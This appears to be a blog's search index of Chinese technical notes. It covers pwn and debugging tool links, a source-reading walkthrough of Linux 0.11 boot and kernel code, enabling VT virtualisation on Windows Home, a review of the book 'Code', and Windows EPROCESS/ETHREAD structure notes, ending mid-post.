<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Treasure House</title>
      <link href="/6666/06/06/Treasure-House/"/>
      <url>/6666/06/06/Treasure-House/</url>
      
        <content type="html"><![CDATA[<p>ida联动gdb</p><p><a href="https://github.com/mahaloz/decomp2dbg">https://github.com/mahaloz/decomp2dbg</a></p><p>追踪堆</p><p><a href="https://github.com/Arinerron/heaptrace">https://github.com/Arinerron/heaptrace</a></p><p>pwn docker现成环境</p><p><a href="https://github.com/skysider/pwndocker">https://github.com/skysider/pwndocker</a></p><p>根据libc.so自动下载ld和dbgsym</p><p><a href="https://github.com/veritas501/dl_dbgsym">https://github.com/veritas501/dl_dbgsym</a></p><p>自动pwn构建</p><p><a href="https://github.com/io12/pwninit">https://github.com/io12/pwninit</a></p><p>iot 虚拟机</p><p><a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a></p><p>编译好的gdbsever</p><p><a href="https://github.com/rapid7/embedded-tools/tree/master/binaries">https://github.com/rapid7/embedded-tools/tree/master/binaries</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RTFSC linux0.11 ing</title>
      <link href="/2024/02/22/RTFSC-linux-11/"/>
      <url>/2024/02/22/RTFSC-linux-11/</url>
      
        <content type="html"><![CDATA[<p> 基本上每天一个文件吧</p><h1 id="RTFSC"><a href="#RTFSC" class="headerlink" title="RTFSC"></a>RTFSC</h1><p>有makefile <a href="https://github.com/cyysu/linux0.11/tree/master">https://github.com/cyysu/linux0.11/tree/master</a><br>无makefile <a href="https://github.com/beride/linux0.11-1">https://github.com/beride/linux0.11-1</a></p><p>可编译调试的 <a href="https://github.com/yuan-xy/Linux-0.11">https://github.com/yuan-xy/Linux-0.11</a></p><p>从服务器启动qemu无图形界面: -curses(在教室开虚拟机太耗电了，只能开云服务器呜呜)</p><ul><li>alt 2切换到监视 alt 1切换会模拟界面</li><li>esc 2和esc 1 同样效果</li></ul><p>vscode配置</p><p>launch.json</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;debug&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/tools/system&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;miDebuggerServerAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;127.0.0.1:1234&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;MIMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gdb&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;run&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>tasks.json</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;run&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;make ; and make debug &quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;isBackground&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h1 id="boot"><a href="#boot" class="headerlink" title="boot"></a>boot</h1><h2 id="bootsect-s"><a href="#bootsect-s" class="headerlink" title="bootsect.s"></a>bootsect.s</h2><p>8086汇编 <code>ljmp   0x7c0:5</code>将cs&#x3D;0x7c0 ip&#x3D;5 跳转到新的代码段和偏移地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ok1_read:</span><br><span class="line">;// 计算和验证当前磁道需要读取的扇区数，放在ax寄存器中。</span><br><span class="line">;// 根据当前磁道还未读取的扇区数以及段内数据字节开始偏移位置，计算如果全部读取这些</span><br><span class="line">;// 未读扇区，所读总字节数是否会超过64KB段长度的限制。若会超过，则根据此次最多能读</span><br><span class="line">;// 入的字节数（64KB - 段内偏移位置），反算出此次需要读取的扇区数。</span><br><span class="line">;//    seg cs</span><br><span class="line">    mov ax,cs:sectors;// 取每磁道扇区数。</span><br><span class="line">    sub ax,sread;// 减去当前磁道已读扇区数。</span><br><span class="line">    mov dx,ax;// ax = 当前磁道未读扇区数。</span><br><span class="line">    mov cl,9</span><br><span class="line">    shl dx,cl;// dx = ax * 512 字节。</span><br><span class="line">    add dx,bx;// dx = dx + 段内当前偏移值（bx）</span><br><span class="line">                        ;//    = 此次读操作后，段内共读入的字节数。</span><br><span class="line">    jnc ok2_read;// 若没有超过64KB字节，则跳转至ok2_read处执行。</span><br><span class="line">    je ok2_read</span><br><span class="line">    xor ax,ax;// 若加上此次将读磁道上所有未读扇区时会超过64KB，则计算</span><br><span class="line">    sub ax,bx;// 此时最多能读入的字节数（64KB － 段内读偏移位置），再转换</span><br><span class="line">    shr ax,cl;// 成需要读取的扇区数。</span><br></pre></td></tr></table></figure><p>因为实模式下寄存器最多寻址64kb，所以需要判断是否需要修改段寄存器,这里我觉得比较有意思的是直接用0减去段内偏移，再把结果当作无符号数做运算得到需要读取扇区数</p><p><code>sub ax,bx</code>ax为0时相当于得到bx的补码也就相当于做了无符号运算0x1 0000-bx，由于寄存器位数限制无法直接操作0x1 0000，感觉这种方法确实好</p><h2 id="setup-s"><a href="#setup-s" class="headerlink" title="setup.s"></a>setup.s</h2><p>准备进入保护模式前先关了中断，这是因为此时idtr寄存器指向0，即bios的中断向量表，后面setup把system移动到0x0处，会覆盖掉这个表，中断也就g了</p><p>然后加载中断描述符表和全局描述符表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lidt fword ptr idt_48            ;// 加载中断描述符表(idt)寄存器，idt_48 是6 字节操作数的位置</span><br><span class="line">;// 前2 字节表示idt 表的限长，后4 字节表示idt 表所处的基地址。</span><br><span class="line">lgdt fword ptr gdt_48            ;// 加载全局描述符表(gdt)寄存器，gdt_48 是6 字节操作数的位置</span><br></pre></td></tr></table></figure><p>lidt lgdt 前两个字节是描述符表的长度限制，后四个字节是描述符表的线性基地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">idt_48:</span><br><span class="line">    dw0;// idt limit=0</span><br><span class="line">    dw0,0;// idt base=0L </span><br><span class="line">gdt_48:</span><br><span class="line">    dw800h;// 全局表长度为2k 字节，因为每8 字节组成一个段描述符项 所以表中共可有256 项。</span><br><span class="line">    dw512+gdt,9h;// 小端序，4个字节构成的内存线性地址：0009&lt;&lt;16 + 0200+gdt 也即90200 + gdt标号。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdt:</span><br><span class="line">    dw0,0,0,0;// 第0 个描述符，不用。</span><br><span class="line">;// 这里在gdt 表中的偏移量为08，当加载代码段寄存器(段选择符)时，使用的是这个偏移值。</span><br><span class="line">    dw07FFh;// 8Mb - limit=2047 (2048*4096=8Mb)</span><br><span class="line">    dw0000h;// base address=0</span><br><span class="line">    dw9A00h;// code read/exec</span><br><span class="line">    dw00C0h;// granularity=4096, 386</span><br><span class="line">;// 这里在gdt 表中的偏移量是10，当加载数据段寄存器(如ds 等)时，使用的是这个偏移值。</span><br><span class="line">    dw07FFh;// 8Mb - limit=2047 (2048*4096=8Mb)</span><br><span class="line">    dw0000h;// base address=0</span><br><span class="line">    dw9200h;// data read/write</span><br><span class="line">    dw00C0h;// granularity=4096, 386</span><br></pre></td></tr></table></figure><p>第1个描述符00C0 9A00 0000 07FF 代码段描述符 基地址:0x0000 0000 DPL&#x3D;0 非一致性代码段 </p><p>第2个描述符00C0 9200 0000 07FF 数据段描述符 基地址:0x0000 0000 DPL&#x3D;0 向上扩展的数据段 </p><p>lmsw来给cr0的PE赋值启用保护模式标志，lmsw是为了兼容80286，386及以上推荐用mov cr0</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    ax,0001h;// 保护模式比特位(PE)。</span><br><span class="line">lmsw ax            ;// 就这样加载机器状态字</span><br><span class="line">jmp 8:0          ;// 跳转至cs 段8，偏移0 处。执行system 中的代码</span><br></pre></td></tr></table></figure><p>cs段选择子为8即000000001 0 00 </p><ul><li>TI位为0 表示是全局描述符里的1个描述符</li><li>RPL&#x3D;0</li></ul><p>跳转到0地址处system模块执行</p><h2 id="head-s"><a href="#head-s" class="headerlink" title="head.s"></a>head.s</h2><p>程序所在物理地址为0，而且此时还没开启分页</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lss esp,_stack_start    ;<span class="comment">// 表示_stack_start -&gt; ss:esp，设置系统堆栈。</span></span><br></pre></td></tr></table></figure><p>_stack_start定义在kernel&#x2F;sched.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> user_stack[PAGE_SIZE &gt;&gt; <span class="number">2</span>];    <span class="comment">// 定义系统堆栈指针，4K。指针指在最后一项。</span></span><br><span class="line">stack_start = &#123;&amp;user_stack[PAGE_SIZE &gt;&gt; <span class="number">2</span>], <span class="number">0x10</span>&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>lss指令把stack_start 前四字节装入ESP寄存器，后两字节装入SS</p></blockquote><p>重新设置了idt表和gdt表后(只是把表长变为了16M),因为前面0地址处的代码已经执行完了就没用了，所以用来做了页目录表</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_pg_dir:        ;<span class="comment">// 页目录将会存放在这里。</span></span><br></pre></td></tr></table></figure><p>并且在后面设置了4个页表来描述16M的物理内存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">org 1000h        ;// 从偏移0x1000 处开始是第1 个页表（偏移0 开始处将存放页表目录）。</span><br><span class="line">pg0:</span><br><span class="line"></span><br><span class="line">org 2000h</span><br><span class="line">pg1:</span><br><span class="line"></span><br><span class="line">org 3000h</span><br><span class="line">pg2:</span><br><span class="line"></span><br><span class="line">org 4000h</span><br><span class="line">pg3:</span><br></pre></td></tr></table></figure><blockquote><p>stosb, stosw, stosd。这三个指令把al ax eax的内容存储到edi指向的内存单元中，同时edi的值根据方向标志的值增加或者减少</p></blockquote><p>设置页目录项和页表具体操作是先把这5个表清零，然后把页目录表项前四项填上值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov eax,_pg_dir</span><br><span class="line">mov [eax],pg0+7    ;页目录项，前20位表示页表基址，后面的12位为7表示了属性:在物理内存 普通用户可读可写</span><br><span class="line">mov [eax+4],pg1+7        </span><br><span class="line">mov [eax+8],pg2+7        </span><br><span class="line">mov [eax+12],pg3+7        </span><br></pre></td></tr></table></figure><p>设置页表项时倒叙从pag3最后一项开始</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov edi,pg3+4092        ;// edi -&gt; 最后一页的最后一项。</span><br><span class="line">mov eax,00fff007h        ;/*  16Mb - 4096 + 7 (r/w user,p) */</span><br><span class="line">;4092-4096是最后一个页表项，此处填写00fff007h来描述16M物理地址最后一个4k属性为在物理内存 普通用户可读可写</span><br></pre></td></tr></table></figure><p>把页目录的前四项这样去映射说明了这个任务的前16M线性地址等于物理地址</p><p>最后设置cr3指向物理地址0即页目录，然后设置cr0 pg位开启分页保护 ret到main函数</p><p><img src="/2024/02/22/RTFSC-linux-11/image-20231123112231893.png" alt="image-20231123112231893"></p><h1 id="init"><a href="#init" class="headerlink" title="init"></a>init</h1><h2 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h2><p>linux0.11管理的最大物理内存是16M，对于不同大小的内存的区域划分是不一样的，以16M物理内存来说</p><p><img src="/2024/02/22/RTFSC-linux-11/image-20231123215714223.png" alt="image-20231123215714223"></p><p>mem_map用来管理除了内核外的15M内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//内存映射字节图(1 字节代表1 页内存)，每个页面对应的字节用于标志页面当前被引用（占用）次数。</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> mem_map [ PAGING_PAGES ] = &#123;<span class="number">0</span>,&#125;;</span><br></pre></td></tr></table></figure><p><strong>mem_init</strong>函数过后把3M缓冲区和虚拟盘所在的mem_map字节置为<strong>USED</strong>宏表示<em>页面被占用标志</em>，主内存区mem_map置为0</p><p><strong>trap_init</strong>函数初始化了中断描述符表，中断描述符TYPE位均为1111即为陷阱门，目标代码段描述符选择子均为8(RPL&#x3D;0，TI&#x3D;0,索引&#x3D;1)，，其中<em>3-5</em>号中断描述符的dpl设置为3，其余为0</p><p><img src="/2024/02/22/RTFSC-linux-11/image-20231123215220376.png" alt="image-20231123215220376"></p><blockquote><p>调用INT3 int n INTO等指令产生的中断或异常检测要求</p><ul><li>先检测当前特权级CPL&lt;&#x3D;中断描述符里的DPL</li><li>再检测中断描述符里代码段描述符选择子的RPL &lt; 当前特权级CPL</li></ul><p>由硬件产生的中断或处理器检测到的异常检测要求</p><ul><li>中断描述符里代码段描述符选择子的RPL &lt; 当前特权级CPL</li></ul><p>陷阱门和中断门唯一区别就是中断门处理时会把IF位清零(关中断)，陷阱门不会</p></blockquote><p><strong>sched_init</strong>初始化了任务0在全局描述符表gdt的tss和ldt分别为0x00008901f44800680x00008201f4300068</p><p>0x00008901f4480068: S&#x3D;0 TYPE:1001 为tss段描述符</p><p><img src="/2024/02/22/RTFSC-linux-11/image-20231124110911039.png" alt="image-20231124110911039"></p><p>0x00008201f4300068 : S&#x3D;0 TYPE:0010 为 ldt描述符</p><p>tss和ldt描述符的基地址都是该任务task_struct结构体里的成员的地址</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ..............</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>[3];</span></span><br><span class="line"><span class="comment">/* tss for this task */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后把task数组除了第一个任务都清空，再把其余gdt表项都清空，把eflags寄存器的NT位置零，防止后面在iret到用户态时时进行任务切换，把tr寄存器设置为任务0的tss</p><p>对于寻找tss的宏一般人都会这样写<code>#define _TSS2(n) (FIRST_TSS_ENTRY+2*n)&lt;&lt;3</code></p><p>linus的写法<code>#define _TSS(n) ((((unsigned long) n)&lt;&lt;4)+(FIRST_TSS_ENTRY&lt;&lt;3))</code>感觉对于当时性能可能会高些，但是现在编译器优化的bt程度可能性能上没有差别</p><blockquote><p>ltr val指令会把gdt里索引val tss描述符基地址和段限长加载，并把TYPE的B置1，表示任务正忙</p></blockquote><p>设置ldtr寄存器指向任务0的ldt</p><p>设置并允许时钟中断处理，设置系统调用中断0x80(陷阱门，DPL&#x3D;3)</p><p>TODO</p><p>利用iret中断返回切换到用户态</p><p><img src="/2024/02/22/RTFSC-linux-11/image-20231124170448393.png" alt="image-20231124170448393"></p><p>init_task的ldt为<strong>INIT_TASK</strong>宏里ldt[1]&#x3D;0x00c0fa000000009f ldt[2]&#x3D;0x00c0f2000000009f</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* ldt[3]*/</span>    &#123;&#123;<span class="number">0</span>, <span class="number">0</span>&#125;, \</span><br><span class="line">    &#123;<span class="number">0x9f</span>, <span class="number">0xc0fa00</span>&#125;, <span class="comment">/* 代码长640K，基址0x0，G=1，D=1，DPL=3，P=1 TYPE=0x0a*/</span>  \</span><br><span class="line">    &#123; <span class="number">0x9f</span>, <span class="number">0xc0f200</span>&#125;,&#125;, <span class="comment">/* 数据长640K，基址0x0，G=1，D=1，DPL=3，P=1 TYPE=0x02*/</span>   \</span><br></pre></td></tr></table></figure><p>堆栈段选择符SS:0x17:00010 1 11 代码段选择符为0xf:1 1 11分别对应ldt里的第二项和第一项</p><h1 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h1><h2 id="asm-s"><a href="#asm-s" class="headerlink" title="asm.s"></a>asm.s</h2><p>at&amp;t语法差别</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xchgl %eax,(%esp) eax和esp栈顶里的值交互</span><br><span class="line">lea 44(%esp),%edx edx=esp+44</span><br><span class="line">call *%eax 调用eax寄存器里的地址 eip=eax，相当于intel的call eax</span><br><span class="line">*  https://stackoverflow.com/questions/62813954/warning-indirect-call-without</span><br></pre></td></tr></table></figure><p>对于无错误码的中断压入0作为默认错误码，这样统一起来处理比较简单(保存现场，传递两个参数old_esp就是cpu帮我们压入几个寄存器的eip的位置,和error_code)</p><h2 id="trap-s"><a href="#trap-s" class="headerlink" title="trap.s"></a>trap.s</h2><p>疑惑的点大多是gcc的“语法糖”和一些不常见的asm inst</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> get_seg_long(seg,addr) (&#123; \</span></span><br><span class="line"><span class="meta">register unsigned long __res; \</span></span><br><span class="line"><span class="meta">__asm__(<span class="string">&quot;push %%fs;mov %%ax,%%fs;movl %%fs:%2,%%eax;pop %%fs&quot;</span> \</span></span><br><span class="line"><span class="meta">    :<span class="string">&quot;=a&quot;</span> (__res) \ <span class="comment">//表示asm块执行完后把eax值给到__res变量</span></span></span><br><span class="line">    :<span class="string">&quot;0&quot;</span> (seg),<span class="string">&quot;m&quot;</span> (*(addr))); \</span><br><span class="line">    <span class="comment">//0表示使用与上一个位置相同的寄存器但是seg的编号仍然是%1，所以&quot;0&quot; (seg)表示asm块里语句执行前把seg加载进eax</span></span><br><span class="line">    <span class="comment">//&quot;m&quot; (*(addr)) 表示一个内存偏移地址值</span></span><br><span class="line">__res;&#125;)<span class="comment">//返回值为__res</span></span><br></pre></td></tr></table></figure><p>首先就是({…})的语句块，语义上这个语句块等于一条语句，语句块的局部变量随语句块结束失效，语句块最后一个表达式就是这个语句块的返回值</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> v = x+(&#123;<span class="built_in">puts</span>(<span class="string">&quot;gr&quot;</span>);z+<span class="number">3</span>;&#125;)+y 等价于 v= x+z+<span class="number">3</span>+y</span><br></pre></td></tr></table></figure><p>lsl指令 load segment limit</p><p>str指令 store task regist</p><p>TODO 暂时没读懂的点: die里str(i)如何获取任务号</p><h2 id="system-call-s"><a href="#system-call-s" class="headerlink" title="system_call.s"></a>system_call.s</h2><p>syscall的时候fs寄存器保持了三环状态，可以用来访问用户数据</p><p>用push和jmp模拟可指定返回地址的call</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pushl $ret_from_sys_call</span><br><span class="line">jmp schedule</span><br></pre></td></tr></table></figure><p>sys_execve和sys_fork是个系统调用不是中断，用了ret而不是iret，(可能是不想单独再开个asm文件写)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Window家庭版开启vt虚拟化</title>
      <link href="/2023/11/27/open-vt/"/>
      <url>/2023/11/27/open-vt/</url>
      
        <content type="html"><![CDATA[<p>除了vt不能开，vmware连win10 x64也不能装，好好好，fuck you wsl2</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先查下cpu是否支持，官网查即可，amd的话就是amd-v</p><p>家庭版 启用或关闭windows功能里没用关闭hype-v选项，需要管理员模式下命令行bcdedit看下hype-v是否关闭，开启的话关闭下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bcdedit /set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure><p>启用或关闭windows功能里去掉</p><p><img src="/2023/11/27/open-vt/image-20231127084443082.png" alt="image-20231127084443082"></p><p>设备安全里去掉内核隔离</p><p><img src="/2023/11/27/open-vt/image-20231127084531340.png" alt="image-20231127084531340"></p><p>重启</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RTFB &lt;&lt;编码:隐匿在计算机软硬件背后的语言&gt;&gt;</title>
      <link href="/2023/11/26/RTFB-Code/"/>
      <url>/2023/11/26/RTFB-Code/</url>
      
        <content type="html"><![CDATA[<p>总的来说是一本不可多得的好书，适合用来科普或者作为cs或者ee专业低年级的先导课(读的时候我就在想，如果我是大一读的这本书该多好，艹)，刚开始没有选用抽象的二极管而是用了继电器来阐述(突然想起bug一词就是因为一只飞蛾卡住继电器)</p><p>可惜后面没时间仔细看，快速过了一遍</p><h2 id="我是-b"><a href="#我是-b" class="headerlink" title="我是*b"></a>我是*b</h2><p><img src="/2023/11/26/RTFB-Code/image-20231118195256519.png" alt="image-20231118195256519"></p><p>当时看见这两个图懵逼了一下，再看一眼就会发现我是*b,这不是摩根定律吗</p><p>$$\overline{A}\times\overline{B}&#x3D;\overline{A+B}$$</p><p>$$\overline{A}+\overline{B}&#x3D;\overline{A\times B}$$</p><h2 id="如何实现减法"><a href="#如何实现减法" class="headerlink" title="如何实现减法"></a>如何实现减法</h2><p>减法里一个麻烦的点就是<strong>借位</strong>操作</p><p>先看一个十进制的例子</p><p><img src="/2023/11/26/RTFB-Code/image-20231118202101855.png" alt="image-20231118202101855"></p><p>先用最大值减去<strong>减数</strong>在加上被减数，再+1-1000来减去这个最大值避免借位操作</p><p>看一个二进制的例子</p><p><img src="/2023/11/26/RTFB-Code/image-20231118202733589.png" alt="image-20231118202733589"></p><p>$$(1111 1111 - 1011 0000)$$避免了借位，这个也就是求反码的相反数的操作，毕竟反码加起来全为1嘛</p><p>只需要用几个反向器就可以完成</p><p><img src="/2023/11/26/RTFB-Code/image-20231118204321473.png" alt="image-20231118204321473"></p><p>通过异或门一端为0来控制输出原本输入，为1输出是输入取反后的</p><p><img src="/2023/11/26/RTFB-Code/image-20231118204500282.png" alt="image-20231118204500282"></p><p>$$(1111 1111 - 1011 0000)+1$$ 各位取反加一已经有补码的味道了，但是现在我们还没有补码的概念，还没有利用最高位溢出，而是直接减去1 0000 0000</p><p><img src="/2023/11/26/RTFB-Code/image-20231118204107259.png" alt="image-20231118204107259"></p><p>有了补码也就不用设计减法器了</p><h2 id="反馈与触发器"><a href="#反馈与触发器" class="headerlink" title="反馈与触发器"></a>反馈与触发器</h2><p>书里说了一个边沿触发的d触发器</p><p><img src="/2023/11/26/RTFB-Code/image-20231119141647975.png" alt="image-20231119141647975"></p><p>可以用来做分频</p><p><img src="/2023/11/26/RTFB-Code/image-20231119142105107.png" alt="image-20231119142105107"></p><p>当我们这样连接的时候</p><p><img src="/2023/11/26/RTFB-Code/image-20231119142141983.png" alt="image-20231119142141983"></p><p>就是一直分频嘛</p><p><img src="/2023/11/26/RTFB-Code/image-20231119142230105.png" alt="image-20231119142230105"></p><p>我当时是没有想到和二进制关系的，直到把这个图顺时针旋转90°</p><p><img src="/2023/11/26/RTFB-Code/image-20231119142552451.png" alt="image-20231119142552451"></p><p>这种以1&#x2F;2分频确实和二进制有着天然的关系，同时观察二进制每一列，变化周期都是和图中一样的(最左边每8个0变换为1，最右边每1个0变换为1)</p><h2 id="RAM"><a href="#RAM" class="headerlink" title="RAM"></a>RAM</h2><p><img src="/2023/11/26/RTFB-Code/image-20231121201214337.png" alt="image-20231121201214337"></p><p>一个触发器可以让我们存储1bit的数据，通过和译码器和选择器就可以构成一个8x1的ram</p><p><img src="/2023/11/26/RTFB-Code/image-20231121201350018.png" alt="image-20231121201350018"></p><p>8x1不同方式连接可以得到8x2或者16x1</p><p><img src="/2023/11/26/RTFB-Code/image-20231121212957056.png" alt="image-20231121212957056"></p><h2 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h2><p>有了存储设备，有了时钟，我们就可以自动化操作，设计一下指令集，用一个存储器存储代码，一个存储数据，在时钟的指挥下，完成取指 译码 执行 写回 (好吧，我承认我是站着说话不腰疼)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows内核:进程和线程</title>
      <link href="/2023/11/09/Windows-Kernel-X86-process-thread/"/>
      <url>/2023/11/09/Windows-Kernel-X86-process-thread/</url>
      
        <content type="html"><![CDATA[<h2 id="进程结构体"><a href="#进程结构体" class="headerlink" title="进程结构体"></a>进程结构体</h2><p><strong>EPROCESS结构体</strong></p><ul><li><p>+0x000 Pcb              : _KPROCESS</p><ul><li>+0x018 DirectoryTableBase : [2] Uint4B 进程页目录表基址</li><li>+0x038 KernelTime       : Uint4B 0环运行时间</li><li>+0x03c UserTime         : Uint4B 三环运行时间</li><li>+0x05c Affinity         : Uint4B 规定该进程可以跑在哪个cpu上 比如11B表示可以再0，1CPU上跑 100B表示只能在2号CPU上跑</li><li>+0x062 BasePriority     : Char 该进程所有线程最起码的优先级</li></ul></li><li><p>+0x070 CreateTime       : _LARGE_INTEGER 进程创建时间</p></li><li><p>+0x078 ExitTime         : _LARGE_INTEGER 进程退出时间</p></li><li><p>+0x084 UniqueProcessId  : Ptr32 Void 进程的编号（任务管理器中的PID）</p></li><li><p>+0x088 ActiveProcessLinks : _LIST_ENTRY 所有的活动进程连接在一起构成双向链表 PsActiveProcessHead全局符号指向链表头部，<strong>需要注意的是这里链表节点指向的都是EPROCESS+0x88的位置</strong></p><ul><li>&#96;&#96;&#96;c<br>_LIST_ENTRY<br>+0x000 Flink            : Ptr32 _LIST_ENTRY&#x2F;&#x2F;指向下一结点，尾部结点的Flink则指向头部<br>+0x004 Blink            : Ptr32 _LIST_ENTRY&#x2F;&#x2F;Blink指向前一结点，首部节点指向尾部结点<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    ![image-20231109115500052](Windows-Kernel-X86-process-thread/image-20231109115500052.png)</span><br><span class="line"></span><br><span class="line">* +0x0bc DebugPort        : Ptr32 Void  +0x0c0 ExceptionPort    : Ptr32 Void 调试相关</span><br><span class="line"></span><br><span class="line">* +0x0c4 ObjectTable      : Ptr32 _HANDLE_TABLE 句柄表，记录了被当前进程打开的所有内核对象句柄，是用来标识某个内核对象的一个`id`，同一个对象的该`id`对于每个进程是不同的。</span><br><span class="line"></span><br><span class="line">* +0x11c VadRoot          : Ptr32 Void 一颗平衡二叉树，标识0-2G哪些地址没占用了，记录了模块映射信息。</span><br><span class="line"></span><br><span class="line">* +0x174 ImageFileName    : [16] UChar 进程镜像文件名</span><br><span class="line"></span><br><span class="line">* +0x1a0 ActiveThreads    : Uint4B 当前进程活动线程的数量</span><br><span class="line"></span><br><span class="line">* +0x1b0 Peb              : Ptr32 _PEB 进程在3环的一个结构体，里面包含了进程的模块列表、是否处于调试状态等信息，减少频繁的进入内核层查询数据</span><br><span class="line"></span><br><span class="line">  * +0x002 BeingDebugged    : UChar 当前进程被调试为1，否则为0</span><br><span class="line">  * +0x008 ImageBaseAddress : Ptr32 Void 进程基址</span><br><span class="line">  * +0x00c Ldr              : Ptr32 _PEB_LDR_DATA 当前进程加载模块的相关信息</span><br><span class="line"></span><br><span class="line">## 线程结构体</span><br><span class="line"></span><br><span class="line">**ETHREAD结构体**</span><br><span class="line"></span><br><span class="line">* +0x000 Tcb              : _KTHREAD</span><br><span class="line"></span><br><span class="line">  * +0x018 InitialStack     : Ptr32 Void 当前线程栈底</span><br><span class="line">    +0x01c StackLimit       : Ptr32 Void 当前线程栈边界(栈可以到达的最低点)</span><br><span class="line">    +0x028 KernelStack      : Ptr32 Void 当前线程栈顶 </span><br><span class="line">    </span><br><span class="line">    上面三个成员都与线程切换相关</span><br><span class="line">  * +0x020 Teb              : 